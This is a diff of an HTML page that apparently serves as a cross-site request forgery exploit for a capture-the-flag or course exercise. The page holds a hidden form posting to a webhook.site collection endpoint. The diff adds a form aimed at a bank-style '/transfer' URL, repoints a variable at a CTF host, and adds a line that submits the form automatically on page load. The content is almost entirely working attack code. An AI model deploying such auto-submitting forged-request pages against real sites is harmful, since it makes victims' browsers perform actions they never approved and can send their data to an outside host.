@@ -4,10 +4,14 @@
     <form id="f" method="POST" action="https://webhook.site/72cc26a4-d931-4815-a455-a1b8dfdbe371">
         <input type="text" name="test" value="test">
     </form>
+    <form id="f" method="POST" action="http://bank.foo/transfer">
+        <input type="text" name="intro" value="bar">
+    </form>
     <script>
-    var url = "https://webhook.site/72cc26a4-d931-4815-a455-a1b8dfdbe371"
+    var url = "https://edu-ctf.csie.org:44303/me"
     //document.getElementsByClassName("pure-form pure-form-aligned")[0].elements[1].value = url
     //document.getElementsByClassName("pure-form pure-form-aligned")[0].submit()
+    document.getElementById("f").submit()
     </script>
   </body>
 </html>
